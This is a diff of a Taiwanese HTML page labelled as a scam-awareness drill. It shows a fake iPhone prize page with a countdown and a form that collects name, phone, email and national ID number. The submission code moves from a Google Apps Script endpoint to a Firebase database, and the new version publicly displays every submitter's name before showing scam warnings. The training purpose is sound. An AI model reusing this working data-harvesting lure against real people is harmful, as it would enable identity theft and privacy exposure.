@@ -1,307 +1,157 @@
 <!DOCTYPE html>
 <html lang="zh-TW">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎉 恭喜您被選中！ - 網路安全教育演練</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Microsoft JhengHei', Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            overflow-x: hidden;
-        }
-        .education-banner {
-            background: #ff4444;
-            color: white;
-            text-align: center;
-            padding: 10px;
-            font-weight: bold;
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse {
-            0% { background: #ff4444; }
-            50% { background: #ff6666; }
-            100% { background: #ff4444; }
-        }
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        .main-card {
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
-            text-align: center;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            margin-bottom: 30px;
-            animation: bounceIn 1s ease-out;
-        }
-        @keyframes bounceIn {
-            0% { transform: scale(0.3); opacity: 0; }
-            50% { transform: scale(1.05); }
-            70% { transform: scale(0.9); }
-            100% { transform: scale(1); opacity: 1; }
-        }
-        .title {
-            font-size: 2.5em;
-            color: #ff6b35;
-            margin-bottom: 20px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
-        }
-        .subtitle {
-            font-size: 1.2em;
-            color: #666;
-            margin-bottom: 30px;
-        }
-        .phone-image {
-            width: 200px;
-            height: 300px;
-            background: linear-gradient(135deg, #1e3c72, #2a5298);
-            border-radius: 30px;
-            margin: 20px auto;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 1.5em;
-            animation: float 3s ease-in-out infinite;
-        }
-        @keyframes float {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
-        }
-        .lucky-button {
-            background: linear-gradient(45deg, #ff6b35, #f7931e);
-            color: white;
-            border: none;
-            padding: 20px 40px;
-            font-size: 1.3em;
-            border-radius: 50px;
-            cursor: pointer;
-            margin: 20px;
-            transition: all 0.3s ease;
-            animation: glow 2s ease-in-out infinite alternate;
-        }
-        @keyframes glow {
-            from { box-shadow: 0 0 20px rgba(255, 107, 53, 0.5); }
-            to { box-shadow: 0 0 30px rgba(255, 107, 53, 0.8), 0 0 40px rgba(255, 107, 53, 0.3); }
-        }
-        .lucky-button:hover {
-            transform: scale(1.05);
-            box-shadow: 0 10px 30px rgba(255, 107, 53, 0.4);
-        }
-        .click-counter {
-            background: #f8f9fa;
-            padding: 20px;
-            border-radius: 15px;
-            margin: 20px 0;
-            border: 2px solid #e9ecef;
-        }
-        .counter-number {
-            font-size: 2em;
-            color: #ff6b35;
-            font-weight: bold;
-        }
-        .marquee-container {
-            background: #333;
-            color: white;
-            padding: 15px 0;
-            overflow: hidden;
-            margin-top: 30px;
-            border-radius: 10px;
-        }
-        .marquee {
-            display: inline-block;
-            white-space: nowrap;
-            animation: scroll 15s linear infinite;
-        }
-        @keyframes scroll {
-            0% { transform: translateX(100%); }
-            100% { transform: translateX(-100%); }
-        }
-        .form-container, .warning-page {
-            display: none;
-            background: white;
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-        }
-        .form-group {
-            margin-bottom: 20px;
-            text-align: left;
-        }
-        .form-group label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-            color: #333;
-        }
-        .form-group input {
-            width: 100%;
-            padding: 12px;
-            border: 2px solid #ddd;
-            border-radius: 8px;
-            font-size: 1em;
-        }
-        .submit-btn, .back-button {
-            width: 100%;
-            padding: 15px 30px;
-            font-size: 1.1em;
-            border-radius: 8px;
-            border: none;
-            color: white;
-            cursor: pointer;
-        }
-        .submit-btn { background: #28a745; }
-        .back-button { background: #007bff; }
-        .warning-icon {
-            font-size: 5em;
-            color: #ff4444;
-            margin-bottom: 20px;
-        }
-        .warning-title {
-            font-size: 2em;
-            color: #ff4444;
-            margin-bottom: 20px;
-        }
-        .warning-text {
-            font-size: 1.1em;
-            line-height: 1.6;
-            color: #333;
-            margin-bottom: 30px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🎉 恭喜您被選中！ - 網路安全教育演練</title>
+  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+  <style>
+    body { font-family: 'Microsoft JhengHei', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #333; margin: 0; padding: 0; }
+    .education-banner { background: #ff4444; color: white; text-align: center; padding: 10px; font-weight: bold; }
+    .container { max-width: 800px; margin: 0 auto; padding: 20px; }
+    .main-card, .form-container, .warning-page { background: white; border-radius: 20px; padding: 30px; margin: 20px 0; box-shadow: 0 10px 20px rgba(0,0,0,0.1); text-align: center; }
+    .title { font-size: 2em; color: #ff6b35; }
+    .subtitle { color: #666; margin-bottom: 20px; }
+    .phone-image { width: 200px; height: 300px; margin: 20px auto; background: linear-gradient(135deg, #1e3c72, #2a5298); color: white; border-radius: 30px; display: flex; align-items: center; justify-content: center; font-size: 1.2em; }
+    .lucky-button { background: #f7931e; color: white; padding: 15px 30px; border: none; border-radius: 50px; font-size: 1.2em; cursor: pointer; margin-top: 20px; }
+    .click-counter { margin: 20px 0; font-weight: bold; }
+    .marquee-container { background: #333; color: white; padding: 10px; border-radius: 10px; overflow: hidden; }
+    .marquee { display: inline-block; white-space: nowrap; animation: scroll 15s linear infinite; }
+    @keyframes scroll { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
+    .form-group { margin-bottom: 15px; text-align: left; }
+    .form-group label { display: block; margin-bottom: 5px; }
+    .form-group input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 8px; }
+    .submit-btn, .back-button { width: 100%; padding: 12px; font-size: 1.1em; border: none; border-radius: 8px; margin-top: 10px; color: white; }
+    .submit-btn { background: #28a745; }
+    .back-button { background: #007bff; }
+  </style>
 </head>
 <body>
-    <div class="education-banner">
-        ⚠️ 這是網路安全教育模擬演練網站 - 請勿輸入真實個人資料 ⚠️
+  <div class="education-banner">
+    ⚠️ 這是網路安全教育模擬演練網站 - 請勿輸入真實個人資料 ⚠️
+  </div>
+  <div class="container">
+    <div id="homepage" class="main-card">
+      <h1 class="title">🎉 恭喜您被選中！</h1>
+      <p class="subtitle">您有機會免費獲得全新 iPhone 16 Pro Max！</p>
+      <div class="phone-image">📱<br>iPhone 16<br>Pro Max</div>
+      <p style="color: #ff6b35; font-size: 1.2em;">⚡ 限時優惠！僅剩 <span id="timer">05:00</span> 分鐘！</p>
+      <button class="lucky-button" onclick="clickLucky()">🎁 立即點擊抽獎！</button>
+      <div class="click-counter">已有 <span id="clickCount">0</span> 人參與抽獎！</div>
     </div>
 
-    <div class="container">
-        <div id="homepage" class="main-card">
-            <h1 class="title">🎉 恭喜您被選中！</h1>
-            <p class="subtitle">您有機會免費獲得全新 iPhone 16 Pro Max！</p>
-            <div class="phone-image">📱<br>iPhone 16<br>Pro Max</div>
-            <p style="color: #ff6b35; font-size: 1.2em; margin: 20px 0;">
-                ⚡ 限時優惠！僅剩 <span id="timer">05:00</span> 分鐘！
-            </p>
-            <button class="lucky-button" onclick="clickLucky()">🎁 立即點擊抽獎！</button>
-            <div class="click-counter">
-                <p>已有 <span class="counter-number" id="clickCount">0</span> 人參與抽獎！</p>
-            </div>
-        </div>
-
-        <div class="marquee-container">
-            <div class="marquee" id="marqueeText">
-                🎉 尚無中獎名單，快來試試手氣！
-            </div>
-        </div>
-
-        <div id="formPage" class="form-container">
-            <h2 style="text-align: center; color: #ff6b35; margin-bottom: 30px;">填寫資料完成抽獎</h2>
-            <form onsubmit="submitForm(event)">
-                <div class="form-group">
-                    <label for="name">姓名：</label>
-                    <input type="text" id="name" name="name" required>
-                </div>
-                <div class="form-group">
-                    <label for="phone">手機號碼：</label>
-                    <input type="tel" id="phone" name="phone" required>
-                </div>
-                <div class="form-group">
-                    <label for="email">電子郵件：</label>
-                    <input type="email" id="email" name="email" required>
-                </div>
-                <div class="form-group">
-                    <label for="idcard">身分證字號：</label>
-                    <input type="text" id="idcard" name="idcard" required>
-                </div>
-                <button type="submit" class="submit-btn">確認送出</button>
-            </form>
-        </div>
-
-        <div id="warningPage" class="warning-page">
-            <div class="warning-icon">⚠️</div>
-            <h2 class="warning-title">停！這是詐騙陷阱！</h2>
-            <div class="warning-text">
-                <p><strong>您剛才差點成為網路詐騙的受害者！</strong></p>
-                <p><strong>常見詐騙手法特徵：</strong></p>
-                <p>• 聲稱您「被選中」或「中獎」</p>
-                <p>• 要求填寫個人敏感資料</p>
-                <p>• 製造緊迫感（限時優惠）</p>
-                <p>• 承諾不切實際的獎品</p>
-                <p><strong>記住：</strong>合法的抽獎活動不會要求您提供身分證字號或銀行帳戶資訊！</p>
-                <p>保護自己，從識破詐騙開始！</p>
-            </div>
-            <button class="back-button" onclick="goHome()">返回首頁</button>
-        </div>
+    <div class="marquee-container">
+      <div class="marquee" id="marqueeText">🎉 尚無中獎名單，快來試試手氣！</div>
     </div>
 
-    <script>
-        let clickCount = 0;
+    <div id="formPage" class="form-container" style="display:none;">
+      <h2 style="color: #ff6b35;">填寫資料完成抽獎</h2>
+      <form onsubmit="submitForm(event)">
+        <div class="form-group">
+          <label for="name">姓名：</label>
+          <input type="text" id="name" required>
+        </div>
+        <div class="form-group">
+          <label for="phone">手機號碼：</label>
+          <input type="tel" id="phone" required>
+        </div>
+        <div class="form-group">
+          <label for="email">電子郵件：</label>
+          <input type="email" id="email" required>
+        </div>
+        <div class="form-group">
+          <label for="idcard">身分證字號：</label>
+          <input type="text" id="idcard" required>
+        </div>
+        <button type="submit" class="submit-btn">確認送出</button>
+      </form>
+    </div>
 
-        function startTimer() {
-            let timeLeft = 300;
-            const timer = setInterval(() => {
-                const minutes = Math.floor(timeLeft / 60);
-                const seconds = timeLeft % 60;
-                document.getElementById('timer').textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-                if (timeLeft <= 0) {
-                    clearInterval(timer);
-                    document.getElementById('timer').textContent = "00:00";
-                }
-                timeLeft--;
-            }, 1000);
-        }
+    <div id="warningPage" class="warning-page" style="display:none;">
+      <div style="font-size: 4em; color: #ff4444;">⚠️</div>
+      <h2 style="color:#ff4444">停！這是詐騙陷阱！</h2>
+      <p>您剛才差點成為網路詐騙的受害者！</p>
+      <p><strong>常見詐騙特徵：</strong></p>
+      <p>• 聲稱您中獎 • 要求填寫個資 • 限時壓力 • 承諾不實獎品</p>
+      <p><strong>記住：</strong>合法抽獎活動不會要求您提供身分證字號！</p>
+      <button class="back-button" onclick="goHome()">返回首頁</button>
+    </div>
+  </div>
 
-        function clickLucky() {
-            clickCount++;
-            document.getElementById('clickCount').textContent = clickCount;
-            document.getElementById('homepage').style.display = 'none';
-            document.getElementById('formPage').style.display = 'block';
-        }
+  <script>
+    // Firebase 設定
+    const firebaseConfig = {
+      apiKey: "AIzaSyBLGufRiE--W_CJu98AZph9TsRLCHuaxr0",
+      authDomain: "fir-fc9d0.firebaseapp.com",
+      databaseURL: "https://fir-fc9d0-default-rtdb.firebaseio.com",
+      projectId: "fir-fc9d0",
+      storageBucket: "fir-fc9d0.appspot.com",
+      messagingSenderId: "490554276031",
+      appId: "1:490554276031:web:8bc5c2a66b0ed63c1ee0a",
+      measurementId: "G-F8SLYQ5LQN"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
-        function submitForm(event) {
-            event.preventDefault();
+    let clickCount = 0;
 
-            const name = document.getElementById('name').value;
-            const phone = document.getElementById('phone').value;
-            const email = document.getElementById('email').value;
-            const idcard = document.getElementById('idcard').value;
+    function startTimer() {
+      let timeLeft = 300;
+      const timer = setInterval(() => {
+        const m = Math.floor(timeLeft / 60);
+        const s = (timeLeft % 60).toString().padStart(2, '0');
+        document.getElementById('timer').textContent = `${m}:${s}`;
+        if (--timeLeft < 0) clearInterval(timer);
+      }, 1000);
+    }
 
-            fetch('https://script.google.com/macros/s/AKfycbziT1d0tz9Tt40iwZCFomqJFBdIJmpJEbfJnVsLifLKoOqzB2rKPw61Fwj39xne-lAPDw/exec', {
+    function clickLucky() {
+      clickCount++;
+      document.getElementById('clickCount').textContent = clickCount;
+      document.getElementById('homepage').style.display = 'none';
+      document.getElementById('formPage').style.display = 'block';
+    }
 
-                method: 'POST',
-                body: JSON.stringify({ name, phone, email, idcard }),
-                headers: { 'Content-Type': 'application/json' }
-            })
-            .then(res => res.json())
-            .then(data => {
-                document.getElementById('marqueeText').textContent = `🎉 ${data.marquee}`;
-                document.getElementById('formPage').style.display = 'none';
-                document.getElementById('warningPage').style.display = 'block';
-            })
-            .catch(err => {
-                alert("提交失敗，請稍後再試！");
-                console.error(err);
-            });
-        }
+    function submitForm(event) {
+      event.preventDefault();
+      const name = document.getElementById('name').value;
+      const phone = document.getElementById('phone').value;
+      const email = document.getElementById('email').value;
+      const idcard = document.getElementById('idcard').value;
 
-        function goHome() {
-            document.getElementById('warningPage').style.display = 'none';
-            document.getElementById('homepage').style.display = 'block';
-            document.getElementById('name').value = '';
-            document.getElementById('phone').value = '';
-            document.getElementById('email').value = '';
-            document.getElementById('idcard').value = '';
-        }
+      // 寫入 Firebase
+      const entry = db.ref('entries').push();
+      entry.set({ name, phone, email, idcard }).then(() => {
+        alert("⚠️ 提醒您：這是一個釣魚詐騙模擬網站，請勿輸入真實資料！");
+        updateMarquee();
+        document.getElementById('formPage').style.display = 'none';
+        document.getElementById('warningPage').style.display = 'block';
+      });
+    }
 
-        window.onload = function() {
-            startTimer();
-        };
-    </script>
+    function updateMarquee() {
+      db.ref('entries').once('value', snapshot => {
+        const data = snapshot.val();
+        const names = Object.values(data || {}).map(d => `${d.name} 中獎！`).join(' ');
+        document.getElementById('marqueeText').textContent = `🎉 ${names}`;
+      });
+    }
+
+    function goHome() {
+      document.getElementById('warningPage').style.display = 'none';
+      document.getElementById('homepage').style.display = 'block';
+      document.getElementById('name').value = '';
+      document.getElementById('phone').value = '';
+      document.getElementById('email').value = '';
+      document.getElementById('idcard').value = '';
+      updateMarquee();
+    }
+
+    window.onload = () => {
+      startTimer();
+      updateMarquee();
+    }
+  </script>
 </body>
 </html>
